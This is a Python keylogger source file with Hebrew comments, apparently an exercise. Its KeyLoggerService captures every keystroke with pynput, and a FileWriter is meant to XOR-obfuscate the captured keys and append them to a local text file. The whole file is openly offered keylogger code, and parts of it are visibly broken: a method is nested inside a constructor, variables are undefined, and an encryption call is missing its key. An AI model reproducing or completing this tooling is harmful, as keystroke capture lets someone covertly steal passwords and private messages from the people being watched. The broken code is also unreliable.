from pynput import keyboard
from abc import ABC, abstractmethod
import threading

text = []
#מחלקה שמפעילה את התוכנית או מכבה
class IKeyLogger(ABC):
    def __init__(self):
        self.text = []
        
    @abstractmethod
    def start_logging(self):
        pass
                          
    @abstractmethod
    def stop_logging(self):
        pass

    @abstractmethod
    def get_logged_keys(self):
        pass
        



#מחלקה שכותבת את המילים המתקבלות לתוך קובץ טקסט
class IWriter(ABC):
    @abstractmethod
    def send_data(self, data: str, machine_name: str):
        pass

        

#xor מחלקה שמצפינה מילים באמצעות
class Encryptor:
    def encryption_using_xor(self,data: list,key):
        encrypted_text = ''
        for i, word in enumerate(data):
            encrypted_text += chr(ord(word) ^ key * i)
        print (encrypted_text)    
        return encrypted_text
    #דוגמא לשימוש בהצפנה
a = Encryptor()
b = a.encryption_using_xor('yosef taktuk ashkelon',4) 
a.encryption_using_xor(b,4)



class KeyLoggerService(IKeyLogger):
    def __init__(self):
        from datetime import datetime
        import queue
        self.listener = None
        super().__init__()
        self.buf = queue.Queue()
    def start_logging(self):
        def on_press(key):
            global text
            if key == keyboard.Key.enter:
                self.text.append(key)
            elif key == keyboard.Key.tab:
                self.text.append(key)
            elif key == keyboard.Key.space:
                self.text.append(' ') 
            elif key == keyboard.Key.shift:
                pass
            elif key == keyboard.Key.backspace and len(text) == 0:
                pass
            elif key == keyboard.Key.backspace and len(text) > 0:
                self.text = self.text[:-1]
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                pass
            elif key == keyboard.Key.esc:
                return False
            else:
                self.text.append(key)
                print(self.text)
        with keyboard.Listener(
            on_press=on_press) as self.listener:
            self.listener.join()       

    def stop_logging(self):
        if self.start_logging:
            self.listener.stop() 
    def get_logged_keys(self):
        return self.text

class FileWriter(IWriter):
    def __init__(self):
        super().__init__()
        Encryption = Encryptor()
        def send_data(self, data: str, machine_name: str):
            for i in data:
                text += Encryption.encryption_using_xor(i)
        with open('text.txt','a') as file:
            file.write(text)

                     

# a = KeyLoggerService()

# b = FileWriter()
# b.send_data()
